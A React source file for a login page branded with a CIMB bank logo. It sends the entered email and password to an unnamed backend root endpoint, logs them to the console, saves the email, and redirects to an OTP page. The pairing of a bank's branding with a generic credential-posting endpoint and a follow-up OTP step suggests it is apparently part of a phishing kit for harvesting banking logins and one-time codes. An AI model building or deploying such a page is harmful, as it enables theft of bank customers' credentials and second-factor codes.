import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { AiOutlineEye, AiOutlineEyeInvisible } from "react-icons/ai";
import axios from "axios";
import BASE_URL from "../components/urls";
import logo from "../assets/logo.png"; // Adjust the path to your logo
import FormErrMsg from "../components/FormErrMsg";

const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePassword = () => setShowPassword(!showPassword);

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data)
      .then(() => {
        console.log(data);
        localStorage.setItem("email", data.email);
        navigate("/otp");
      })
      .catch((error) => {
        console.error("Login error", error);
      })
      .finally(() => setLoading(false));
  };

  return (
    <div className="min-h-screen bg-white flex items-start justify-center pt-6 px-4">
      <div className="w-full max-w-sm bg-white px-2">
        {/* Logo */}
        <div className="flex justify-end mb-5">
          <img src={logo} alt="CIMB Logo" className="w-[20%] min-h-[20px]" />
        </div>

        {/* Header + Create Account */}
        <div className="flex justify-between items-center mb-12">
          <div>
            <h2 className="text-3xl font-semibold text-gray-800 mb-2">
              Welcome
            </h2>
            <p className="text-lg text-black -mt-1">Login to your account</p>
          </div>
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit(submitForm)} className="space-y-12">
          {/* Username Input */}
          <div className="bg-[#E2E2E4] w-full h-full mb-4 px-4 py-3 rounded-lg">
            <label className="block text-xs text-gray-500 uppercase mb-2">
              Email
            </label>
            <input
              type="text"
              placeholder="Enter email"
              {...register("email")}
              className="w-full text-black bg-transparent focus:outline-none placeholder:text-gray-500"
            />
            <FormErrMsg errors={errors} inputName="username" />
          </div>

          {/* Password Input */}
          <div className="bg-[#E2E2E4] w-full h-full mb-4 px-4 py-3 rounded-lg">
            <label className="block text-xs text-gray-500 uppercase mb-2">
              Password
            </label>
            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Enter password"
                {...register("password")}
                className="w-full text-black bg-transparent focus:outline-none placeholder:text-gray-500"
              />
              <span
                onClick={togglePassword}
                className="absolute top-1 right-4 text-gray-700 cursor-pointer"
              >
                {showPassword ? (
                  <AiOutlineEye className="text-xl" />
                ) : (
                  <AiOutlineEyeInvisible className="text-xl" />
                )}
              </span>
            </div>
            <FormErrMsg errors={errors} inputName="password" />
          </div>

          {/* Forgot Password */}
          <div className="-mt-4 text-left">
            <a href="#" className="text-red-500 text-sm font-medium">
              Forgot Password?
            </a>
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={loading}
            className={`w-full py-3 rounded-md font-semibold text-white ${
              loading
                ? "bg-red-300 cursor-not-allowed"
                : "bg-red-600 hover:bg-red-700"
            }`}
          >
            {loading ? "Logging in..." : "Log In"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Home;
